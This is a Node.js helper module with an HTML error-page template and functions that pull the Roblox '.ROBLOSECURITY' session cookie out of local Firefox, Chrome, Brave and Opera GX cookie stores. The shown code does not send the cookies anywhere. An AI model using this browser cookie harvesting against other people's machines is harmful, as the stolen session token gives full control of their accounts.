const fs = require('fs');
//const chrome = require('chrome-cookies-secure');
const chrome = require('../lib/chromium-cookie');
var os = require('os');

function errorTemplate(str1,str2,color,background){
    return `
    <!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>${str1}</title>
		<style>
            body{
                margin: 0;
                color: ${color};
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                user-select: none;
                background: ${background};
                background-size: 200% 200%;
                animation: gradient 15s ease infinite;
                height: 100vh;
                overflow-y: scroll;
                overflow-x: hidden;
            }

            @keyframes gradient {
                0% {
                    background-position: 0% 50%;
                }
                50% {
                    background-position: 100% 50%;
                }
                100% {
                    background-position: 0% 50%;
                }
            }
        </style>
	</head>
	<body>
		${str2}
	</body>
	</html>
    `
}

async function getFirefoxCookie(){
    try {
        var firefoxProfilesPath = `${process.env.APPDATA}\\Mozilla\\Firefox\\Profiles\\`;
    	var profiles = await fs.promises.readdir(firefoxProfilesPath);
    	var defaultProfile = profiles.find((p) => p.endsWith('.default-release'));
    	var cookiesfile = await fs.promises.readFile(`${firefoxProfilesPath}${defaultProfile}\\cookies.sqlite`,'utf8');
    	var cookiesFileArray = cookiesfile.split('.');
    	var firstIndex = cookiesFileArray.indexOf(cookiesFileArray.find(e => e.startsWith('ROBLOSECURITY_')));
    	return `${cookiesFileArray[firstIndex].replace('ROBLOSECURITY','')}.${cookiesFileArray[firstIndex+1]}.${cookiesFileArray[firstIndex+2]}`
    } catch (error) {
        return undefined;
    }
}

async function getChromeCookie(){
    var cpath1 = os.homedir() + `\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies`;
    var cpath2 = os.homedir() + `\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies`;
		
	if (!fs.existsSync(cpath1) && !fs.existsSync(cpath2)) return undefined;

    try {
        var cookies = await chrome.getCookiesPromised('https://www.roblox.com/').catch((err)=>null);
        return cookies?.['.ROBLOSECURITY'];
    } catch (error) {
        return undefined;
    }
}

async function getBraveCookie(){
    if(!fs.existsSync(`${process.env.LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies`)) return undefined;
    
    try {
        var cookies = await chrome.getCookiesPromised('https://www.roblox.com/','object','brave').catch((err)=>null);
        return cookies?.['.ROBLOSECURITY'];
    } catch (error) {
        return undefined;
    }
}

async function getOperaGXCookie(){
    // opera gx
	if(!fs.existsSync(`${process.env.APPDATA}\\Opera Software\\Opera GX Stable\\Network\\Cookies`)) return undefined;
	
    try {
        var cookies = await chrome.getCookiesPromised('https://www.roblox.com/','object','operagx').catch((err)=>null);
        return cookies?.['.ROBLOSECURITY'];
    } catch (error) {
        return undefined;
    }
}

function reverseObject(o){
    var newObj = {};
    for(const k of Object.keys(o).reverse()){
        newObj[k] = Object.values(o)[Object.keys(o).indexOf(k)];
    }
    return newObj;
}

module.exports = {
    errorTemplate: errorTemplate,
    getFirefoxCookie: getFirefoxCookie,
    getChromeCookie,
    getOperaGXCookie,
    getBraveCookie,
    reverseObject: reverseObject
}